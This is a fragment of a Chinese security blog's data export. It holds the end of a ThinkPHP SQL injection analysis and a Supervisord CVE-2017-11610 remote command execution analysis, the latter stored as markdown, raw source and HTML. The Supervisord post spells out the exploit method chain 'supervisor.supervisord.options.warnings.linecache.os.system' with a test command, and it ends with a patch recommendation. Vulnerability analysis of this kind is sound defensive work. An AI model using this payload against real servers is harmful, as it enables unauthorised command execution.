src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/13-4.png\"></p>\n<p>刚才的$sql变量，这次又传递给了Query.php中的$sql变量了，这里的$bind，实际上就是用来取出真是value值的。</p>\n<p>然后在上图红圈中，使用execute进行参数化查询。由于$sql变量可控，里面可以包含我们传入的恶意字符串，因此，即使用了参数化查询，也没法避免sql注入的产生。</p>\n<p>这个漏洞怎么利用呢？这关系的Query.php中的这个insert方法，看看thinkphp中关于这个方法的使用说明</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/14-4.png\"></p>\n<p>我这里给个demo，帮助大家理解下应用场景。</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/15-4.png\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a><strong>总结</strong></h2><p>理论上来说，利用参数化查询，将要执行的sql语句和参数分开传入，的确可以防止sql注入的产生。但是像这个案例，要执行的sql语句中的内容竟然可控，那就比较尴尬了。</p>\n<h2 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a><strong>思考</strong></h2><p>漏洞分析虽然告一段落了，这里我给大家提出几个问题，看看大家有没有真的弄明白这个漏洞。</p>\n<ol>\n<li>如果我直接通过get方法传入一个字符串，这个漏洞会利用成功吗？</li>\n<li>最终的修补如下图<br><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/16-4.png\"></li>\n</ol>\n<p>当$val[0]=exp的时候，$val[1]仍然可控，并且也传入了$result[$item]里了，这里是否还是有漏洞呢？为什么thinkphp不修这里呢？</p>\n<p><strong>答案</strong></p>\n<ul>\n<li>get传入的值如果是一个字符串，最终会到如下这里<br><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/17-4.png\"></li>\n</ul>\n<p>最终的$result[$item]中的$key值是不可控的，</p>\n<p>对于我给出的那个例子</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/18-3.png\"></p>\n<p>$key就是红圈中的内容</p>\n<p>因此最终执行时，$sql不可控，还利用了参数化查询，完全没有注入的可能，如下图</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/19-2.png\"></p>\n<p>&nbsp;</p>\n<p><strong>答案2</strong></p>\n<p>这个问题也困扰到我了，找到这个问题的时间简直比分析漏洞的时间还长。</p>\n<p>通过Input方法传入的变量，会中途经过\\library\\think\\Request.php中的input方法进行处理，然而在这个方法中，有一个过滤器。。。</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/20-2.png\"></p>\n<p>如果$data是数组形式的，就利用$this-&gt;filterValue进行处理</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/21-2.png\"></p>\n<p>这个过滤器还没对我们的$data下手，注意看红框处，filterExp</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/22-2.png\"></p>\n<p>在这里，filterExp如果匹配到了exp，则会给它后面加一个空格，这就导致了我们通过get/post</p>\n<p>提交进来的数组中，如果有exp，则会被处理为“exp ”，因此无法进入”exp”这个case</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/23-2.png\"></p>"},{"title":"Supervisord远程命令执行漏洞分析(CVE-2017-11610)","date":"2017-08-10T07:27:20.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nSupervisord是一款由Python语言开发，用于管理后台应用（<span id=\"rlt_4\">服务</span>）的工具，方便运维人员使用图形化界面进行管理。\n\n近期，Supervisord曝出了一个需认证的远程命令执行漏洞（CVE-2017-11610），通过POST请求Supervisord管理界面恶意<span id=\"rlt_8\">数据</span>，可以获取<span id=\"rlt_2\">服务器</span><span id=\"rlt_10\">操作</span>权限，存在严重的安全风险。\n\n<!--more-->\n\n## Supervisor介绍\n\n[Supervisor](http://supervisord.org/) 是基于 Python 的进程管理工具，可以帮助我们更简单的启动、重启和停止服务器上的后台进程，是 Linux 服务器管理的效率工具。Supervisor有四个组件：\n\n1. supervisord\n\n运行Supervisor的后台服务，它用来启动和管理那些你需要Supervisor管理的子进程，响应客户端发来的请求，重启意外退出的子进程，将子进程的stdout和stderr写入日志，响应事件等。它是Supervisor最核心的部分。\n\n2. supervisorctl\n\n相当于supervisord的客户端，它是一个命令行工具，用户可以通过它向supervisord服务发指令，比如查看子进程状态，启动或关闭子进程。它可以连接不同的supervisord服务，包括远程机上的服务。\n\n3. Web服务器\n\n这是supervisord的Web客户端，用户可以在Web页面上完成类似于supervisorctl的功能。\n\n4. XML-RPC接口\n\n这是留给第三方集成的接口，你的服务可以在远程调用这些XML-RPC接口来控制supervisord管理的子进程。上面的Web服务器其实也是通过这个XML-RPC接口实现的。\n\n## 漏洞简介\n\n本次漏洞就出在XML-RPC接口对数据的处理上。\n\n默认情况下Supervisor并不会开启这个接口，但这并不代表这个漏洞不重要，相反的是，在Supervisor的使用中，很多人喜欢利用web页面来管理，而不是使用上文中提到的supervisorctl命令行工具。使用web页面有一个方便之处，即通过简单配置，使用者可以在其他机器的浏览器上通过网址访问并控制Supervisor。省去非一定在本地配置的麻烦（例如在docker中使用Supervisor，就不用每次进入容器控制Supervisor）。\n\n开启web访问的配置如下\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/1-2.png)\n\n## 漏洞分析\n\n本次分析从Supervisor入口出发，根据漏洞的相关披露，层层进行解析。\n\n先从入口看起：Supervisord启动文件Supervisord.py。\n\n因为事先知道攻击数据是通过http方式传入到sever端的，所以重点关注下Supervisord启动方法（run）中的启动http服务方法，这里是self.options.openhttpservers()\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810111649.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810111953.png)\n\n跟入options.py文件中去：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810112027.png)\n\n在这里可以看到self.httpservers = self.make_http_servers(supervisord)\n\n在这里调用了make_http_servers()方法\n\n在Options类中找到make_http_servers()方法：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/微信截图_20170810112048.png)\n\n可见这个方法是从supervisor.http中导入的，我们继续跟进http.py文件查看make_http_servers()方法的实现\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810115450.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810115513.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810115513.png)\n\n根据漏洞的披露，我们知道这个漏洞是在XML-RPC接口的调用上出现了问题，在上图代码的最后一行supervisor_xmlrpc_handler()方法，就是用来处理RPC调用的。\n\n我们从supervisor的入口开始，一路顺藤摸瓜找到了罪魁祸首，接下来跟进supervisor_xmlrpc_handler()方法看一下出现漏洞的原因\n\nsupervisor_xmlrpc_handler方法在xmlrpc.py文件中实现，\n\n**![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810112309.png)\n**找到漏洞纰漏的traverse方法，可以看到supervisor_xmlrpc_handler()方法中的call函数将解析出来的method以及params传入tracerse方法中。\n\n我们先来看下call函数在哪里被调用，以及method，params到底是什么：\n\n在supervisor_xmlrpc_handler这个类中，有一个continue_request()函数，如下所示\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810112318.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810115513.png)\n\n在params, method = self.loads(data)一行中，可以看到params和method的产生，并且在这个函数最下面一行，可见调用了call()将返回值给了value。我们先看下这个类中的loads函数，如下所示：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810112357.png)\n\n可见params和method是由xml tag中的methodName和params中的值得来的。\n\n上面说的有些抽象，为了方便下面漏洞的理解，下面举个例子：在这里利用python使用RPC协议给supervisord发一个请求，来看下RPC协议的结构和params、method分别是什么。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/2-3.png)\n\n抓取的流量如下图：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/3-2.png)\n\n这里的supervisor.supervisord.options.warnings.linecache.os.system就是method参数值，而param的值就是touch /tmp/success1\n\n正常的交互中，这两个值往往是method=supervisor.startProcess;param=要启动的应用名\n\n现在call()函数已经明晰了，再看看call函数中的tracerse方法。下面继续跟入tracerse方法\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810112422.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810115513.png)\n\n在tracerse方法中，将传入的method通过“.”来拆分，赋值给path判断开头是否为“_”,如果是，则报错\n\n然后看ob = getattr(ob, name, None)这行，getattr()是一个自省函数，下面举一个简单的例子说明下getattr()\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/4-2.png)\n\n我们仔细分析下如下代码：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/微信截图_20170810112444-1.png)\n\n在这里类似一个递归，将原本链状的method中的方法遍历出来，例如method原先的结构是a.b.c.d这里path列表就应该是[a,b,c,d],然后遍历name。通过ob = getattr(ob, name, None)，首先将ob中的a方法赋给新的ob，再将新的ob（现在是a方法）中的b方法取出来赋给新的ob。以此类推，最终的ob会是链状结构最后一个方法（也就是d），然后传入params值，被执行\n\n所以如果想攻击利用成功，必须找到一个调用链，例如如下调用链\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/微信截图_20170810112456.png)\n\n下图是调用关系：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/5-2.png)\n\nOptions中的warnings方法\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/6-2.png)\n\nWarnings中的linecache方法\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/7-2.png)\n\nLinecache中的os方法\n\n## 漏洞利用\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/8-2.png)\n\n## 解决方案\n\n升级supervisor到最新版本或在配置中修改[inet_http_server]配置","source":"_posts/supervisord-cve-2017-11610.md","raw":"---\ntitle: Supervisord远程命令执行漏洞分析(CVE-2017-11610)\ndate: 2017-08-10 15:27:20\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nSupervisord是一款由Python语言开发，用于管理后台应用（<span id=\"rlt_4\">服务</span>）的工具，方便运维人员使用图形化界面进行管理。\n\n近期，Supervisord曝出了一个需认证的远程命令执行漏洞（CVE-2017-11610），通过POST请求Supervisord管理界面恶意<span id=\"rlt_8\">数据</span>，可以获取<span id=\"rlt_2\">服务器</span><span id=\"rlt_10\">操作</span>权限，存在严重的安全风险。\n\n<!--more-->\n\n## Supervisor介绍\n\n[Supervisor](http://supervisord.org/) 是基于 Python 的进程管理工具，可以帮助我们更简单的启动、重启和停止服务器上的后台进程，是 Linux 服务器管理的效率工具。Supervisor有四个组件：\n\n1. supervisord\n\n运行Supervisor的后台服务，它用来启动和管理那些你需要Supervisor管理的子进程，响应客户端发来的请求，重启意外退出的子进程，将子进程的stdout和stderr写入日志，响应事件等。它是Supervisor最核心的部分。\n\n2. supervisorctl\n\n相当于supervisord的客户端，它是一个命令行工具，用户可以通过它向supervisord服务发指令，比如查看子进程状态，启动或关闭子进程。它可以连接不同的supervisord服务，包括远程机上的服务。\n\n3. Web服务器\n\n这是supervisord的Web客户端，用户可以在Web页面上完成类似于supervisorctl的功能。\n\n4. XML-RPC接口\n\n这是留给第三方集成的接口，你的服务可以在远程调用这些XML-RPC接口来控制supervisord管理的子进程。上面的Web服务器其实也是通过这个XML-RPC接口实现的。\n\n## 漏洞简介\n\n本次漏洞就出在XML-RPC接口对数据的处理上。\n\n默认情况下Supervisor并不会开启这个接口，但这并不代表这个漏洞不重要，相反的是，在Supervisor的使用中，很多人喜欢利用web页面来管理，而不是使用上文中提到的supervisorctl命令行工具。使用web页面有一个方便之处，即通过简单配置，使用者可以在其他机器的浏览器上通过网址访问并控制Supervisor。省去非一定在本地配置的麻烦（例如在docker中使用Supervisor，就不用每次进入容器控制Supervisor）。\n\n开启web访问的配置如下\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/1-2.png)\n\n## 漏洞分析\n\n本次分析从Supervisor入口出发，根据漏洞的相关披露，层层进行解析。\n\n先从入口看起：Supervisord启动文件Supervisord.py。\n\n因为事先知道攻击数据是通过http方式传入到sever端的，所以重点关注下Supervisord启动方法（run）中的启动http服务方法，这里是self.options.openhttpservers()\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810111649.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810111953.png)\n\n跟入options.py文件中去：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810112027.png)\n\n在这里可以看到self.httpservers = self.make_http_servers(supervisord)\n\n在这里调用了make_http_servers()方法\n\n在Options类中找到make_http_servers()方法：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/微信截图_20170810112048.png)\n\n可见这个方法是从supervisor.http中导入的，我们继续跟进http.py文件查看make_http_servers()方法的实现\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810115450.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810115513.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810115513.png)\n\n根据漏洞的披露，我们知道这个漏洞是在XML-RPC接口的调用上出现了问题，在上图代码的最后一行supervisor_xmlrpc_handler()方法，就是用来处理RPC调用的。\n\n我们从supervisor的入口开始，一路顺藤摸瓜找到了罪魁祸首，接下来跟进supervisor_xmlrpc_handler()方法看一下出现漏洞的原因\n\nsupervisor_xmlrpc_handler方法在xmlrpc.py文件中实现，\n\n**![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810112309.png)\n**找到漏洞纰漏的traverse方法，可以看到supervisor_xmlrpc_handler()方法中的call函数将解析出来的method以及params传入tracerse方法中。\n\n我们先来看下call函数在哪里被调用，以及method，params到底是什么：\n\n在supervisor_xmlrpc_handler这个类中，有一个continue_request()函数，如下所示\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810112318.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810115513.png)\n\n在params, method = self.loads(data)一行中，可以看到params和method的产生，并且在这个函数最下面一行，可见调用了call()将返回值给了value。我们先看下这个类中的loads函数，如下所示：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810112357.png)\n\n可见params和method是由xml tag中的methodName和params中的值得来的。\n\n上面说的有些抽象，为了方便下面漏洞的理解，下面举个例子：在这里利用python使用RPC协议给supervisord发一个请求，来看下RPC协议的结构和params、method分别是什么。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/2-3.png)\n\n抓取的流量如下图：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/3-2.png)\n\n这里的supervisor.supervisord.options.warnings.linecache.os.system就是method参数值，而param的值就是touch /tmp/success1\n\n正常的交互中，这两个值往往是method=supervisor.startProcess;param=要启动的应用名\n\n现在call()函数已经明晰了，再看看call函数中的tracerse方法。下面继续跟入tracerse方法\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810112422.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM截图20170810115513.png)\n\n在tracerse方法中，将传入的method通过“.”来拆分，赋值给path判断开头是否为“_”,如果是，则报错\n\n然后看ob = getattr(ob, name, None)这行，getattr()是一个自省函数，下面举一个简单的例子说明下getattr()\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/4-2.png)\n\n我们仔细分析下如下代码：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/微信截图_20170810112444-1.png)\n\n在这里类似一个递归，将原本链状的method中的方法遍历出来，例如method原先的结构是a.b.c.d这里path列表就应该是[a,b,c,d],然后遍历name。通过ob = getattr(ob, name, None)，首先将ob中的a方法赋给新的ob，再将新的ob（现在是a方法）中的b方法取出来赋给新的ob。以此类推，最终的ob会是链状结构最后一个方法（也就是d），然后传入params值，被执行\n\n所以如果想攻击利用成功，必须找到一个调用链，例如如下调用链\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/微信截图_20170810112456.png)\n\n下图是调用关系：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/5-2.png)\n\nOptions中的warnings方法\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/6-2.png)\n\nWarnings中的linecache方法\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/7-2.png)\n\nLinecache中的os方法\n\n## 漏洞利用\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/8-2.png)\n\n## 解决方案\n\n升级supervisor到最新版本或在配置中修改[inet_http_server]配置","slug":"supervisord-cve-2017-11610","published":1,"updated":"2020-10-27T09:27:09.758Z","_id":"ckgrozua3004ywsa9120jbvmz","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Supervisord是一款由Python语言开发，用于管理后台应用（<span id=\"rlt_4\">服务</span>）的工具，方便运维人员使用图形化界面进行管理。</p>\n<p>近期，Supervisord曝出了一个需认证的远程命令执行漏洞（CVE-2017-11610），通过POST请求Supervisord管理界面恶意<span id=\"rlt_8\">数据</span>，可以获取<span id=\"rlt_2\">服务器</span><span id=\"rlt_10\">操作</span>权限，存在严重的安全风险。</p>\n<a id=\"more\"></a>\n\n<h2 id=\"Supervisor介绍\"><a href=\"#Supervisor介绍\" class=\"headerlink\" title=\"Supervisor介绍\"></a>Supervisor介绍</h2><p><a href=\"http://supervisord.org/\">Supervisor</a> 是基于 Python 的进程管理工具，可以帮助我们更简单的启动、重启和停止服务器上的后台进程，是 Linux 服务器管理的效率工具。Supervisor有四个组件：</p>\n<ol>\n<li>supervisord</li>\n</ol>\n<p>运行Supervisor的后台服务，它用来启动和管理那些你需要Supervisor管理的子进程，响应客户端发来的请求，重启意外退出的子进程，将子进程的stdout和stderr写入日志，响应事件等。它是Supervisor最核心的部分。</p>\n<ol start=\"2\">\n<li>supervisorctl</li>\n</ol>\n<p>相当于supervisord的客户端，它是一个命令行工具，用户可以通过它向supervisord服务发指令，比如查看子进程状态，启动或关闭子进程。它可以连接不同的supervisord服务，包括远程机上的服务。</p>\n<ol start=\"3\">\n<li>Web服务器</li>\n</ol>\n<p>这是supervisord的Web客户端，用户可以在Web页面上完成类似于supervisorctl的功能。</p>\n<ol start=\"4\">\n<li>XML-RPC接口</li>\n</ol>\n<p>这是留给第三方集成的接口，你的服务可以在远程调用这些XML-RPC接口来控制supervisord管理的子进程。上面的Web服务器其实也是通过这个XML-RPC接口实现的。</p>\n<h2 id=\"漏洞简介\"><a href=\"#漏洞简介\" class=\"headerlink\" title=\"漏洞简介\"></a>漏洞简介</h2><p>本次漏洞就出在XML-RPC接口对数据的处理上。</p>\n<p>默认情况下Supervisor并不会开启这个接口，但这并不代表这个漏洞不重要，相反的是，在Supervisor的使用中，很多人喜欢利用web页面来管理，而不是使用上文中提到的supervisorctl命令行工具。使用web页面有一个方便之处，即通过简单配置，使用者可以在其他机器的浏览器上通过网址访问并控制Supervisor。省去非一定在本地配置的麻烦（例如在docker中使用Supervisor，就不用每次进入容器控制Supervisor）。</p>\n<p>开启web访问的配置如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/1-2.png\"></p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>本次分析从Supervisor入口出发，根据漏洞的相关披露，层层进行解析。</p>\n<p>先从入口看起：Supervisord启动文件Supervisord.py。</p>\n<p>因为事先知道攻击数据是通过http方式传入到sever端的，所以重点关注下Supervisord启动方法（run）中的启动http服务方法，这里是self.options.openhttpservers()</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810111649.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810111953.png\"></p>\n<p>跟入options.py文件中去：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810112027.png\"></p>\n<p>在这里可以看到self.httpservers = self.make_http_servers(supervisord)</p>\n<p>在这里调用了make_http_servers()方法</p>\n<p>在Options类中找到make_http_servers()方法：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20170810112048.png\"></p>\n<p>可见这个方法是从supervisor.http中导入的，我们继续跟进http.py文件查看make_http_servers()方法的实现</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810115450.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810115513.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810115513.png\"></p>\n<p>根据漏洞的披露，我们知道这个漏洞是在XML-RPC接口的调用上出现了问题，在上图代码的最后一行supervisor_xmlrpc_handler()方法，就是用来处理RPC调用的。</p>\n<p>我们从supervisor的入口开始，一路顺藤摸瓜找到了罪魁祸首，接下来跟进supervisor_xmlrpc_handler()方法看一下出现漏洞的原因</p>\n<p>supervisor_xmlrpc_handler方法在xmlrpc.py文件中实现，</p>\n<p>**<img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810112309.png\"><br>**找到漏洞纰漏的traverse方法，可以看到supervisor_xmlrpc_handler()方法中的call函数将解析出来的method以及params传入tracerse方法中。</p>\n<p>我们先来看下call函数在哪里被调用，以及method，params到底是什么：</p>\n<p>在supervisor_xmlrpc_handler这个类中，有一个continue_request()函数，如下所示</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810112318.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810115513.png\"></p>\n<p>在params, method = self.loads(data)一行中，可以看到params和method的产生，并且在这个函数最下面一行，可见调用了call()将返回值给了value。我们先看下这个类中的loads函数，如下所示：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810112357.png\"></p>\n<p>可见params和method是由xml tag中的methodName和params中的值得来的。</p>\n<p>上面说的有些抽象，为了方便下面漏洞的理解，下面举个例子：在这里利用python使用RPC协议给supervisord发一个请求，来看下RPC协议的结构和params、method分别是什么。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/2-3.png\"></p>\n<p>抓取的流量如下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/3-2.png\"></p>\n<p>这里的supervisor.supervisord.options.warnings.linecache.os.system就是method参数值，而param的值就是touch /tmp/success1</p>\n<p>正常的交互中，这两个值往往是method=supervisor.startProcess;param=要启动的应用名</p>\n<p>现在call()函数已经明晰了，再看看call函数中的tracerse方法。下面继续跟入tracerse方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810112422.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810115513.png\"></p>\n<p>在tracerse方法中，将传入的method通过“.”来拆分，赋值给path判断开头是否为“_”,如果是，则报错</p>\n<p>然后看ob = getattr(ob, name, None)这行，getattr()是一个自省函数，下面举一个简单的例子说明下getattr()</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/4-2.png\"></p>\n<p>我们仔细分析下如下代码：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20170810112444-1.png\"></p>\n<p>在这里类似一个递归，将原本链状的method中的方法遍历出来，例如method原先的结构是a.b.c.d这里path列表就应该是[a,b,c,d],然后遍历name。通过ob = getattr(ob, name, None)，首先将ob中的a方法赋给新的ob，再将新的ob（现在是a方法）中的b方法取出来赋给新的ob。以此类推，最终的ob会是链状结构最后一个方法（也就是d），然后传入params值，被执行</p>\n<p>所以如果想攻击利用成功，必须找到一个调用链，例如如下调用链</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20170810112456.png\"></p>\n<p>下图是调用关系：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/5-2.png\"></p>\n<p>Options中的warnings方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/6-2.png\"></p>\n<p>Warnings中的linecache方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/7-2.png\"></p>\n<p>Linecache中的os方法</p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/8-2.png\"></p>\n<h2 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h2><p>升级supervisor到最新版本或在配置中修改[inet_http_server]配置</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/网络安全威胁月报.jpg","excerpt":"<p>Supervisord是一款由Python语言开发，用于管理后台应用（<span id=\"rlt_4\">服务</span>）的工具，方便运维人员使用图形化界面进行管理。</p>\n<p>近期，Supervisord曝出了一个需认证的远程命令执行漏洞（CVE-2017-11610），通过POST请求Supervisord管理界面恶意<span id=\"rlt_8\">数据</span>，可以获取<span id=\"rlt_2\">服务器</span><span id=\"rlt_10\">操作</span>权限，存在严重的安全风险。</p>","more":"<h2 id=\"Supervisor介绍\"><a href=\"#Supervisor介绍\" class=\"headerlink\" title=\"Supervisor介绍\"></a>Supervisor介绍</h2><p><a href=\"http://supervisord.org/\">Supervisor</a> 是基于 Python 的进程管理工具，可以帮助我们更简单的启动、重启和停止服务器上的后台进程，是 Linux 服务器管理的效率工具。Supervisor有四个组件：</p>\n<ol>\n<li>supervisord</li>\n</ol>\n<p>运行Supervisor的后台服务，它用来启动和管理那些你需要Supervisor管理的子进程，响应客户端发来的请求，重启意外退出的子进程，将子进程的stdout和stderr写入日志，响应事件等。它是Supervisor最核心的部分。</p>\n<ol start=\"2\">\n<li>supervisorctl</li>\n</ol>\n<p>相当于supervisord的客户端，它是一个命令行工具，用户可以通过它向supervisord服务发指令，比如查看子进程状态，启动或关闭子进程。它可以连接不同的supervisord服务，包括远程机上的服务。</p>\n<ol start=\"3\">\n<li>Web服务器</li>\n</ol>\n<p>这是supervisord的Web客户端，用户可以在Web页面上完成类似于supervisorctl的功能。</p>\n<ol start=\"4\">\n<li>XML-RPC接口</li>\n</ol>\n<p>这是留给第三方集成的接口，你的服务可以在远程调用这些XML-RPC接口来控制supervisord管理的子进程。上面的Web服务器其实也是通过这个XML-RPC接口实现的。</p>\n<h2 id=\"漏洞简介\"><a href=\"#漏洞简介\" class=\"headerlink\" 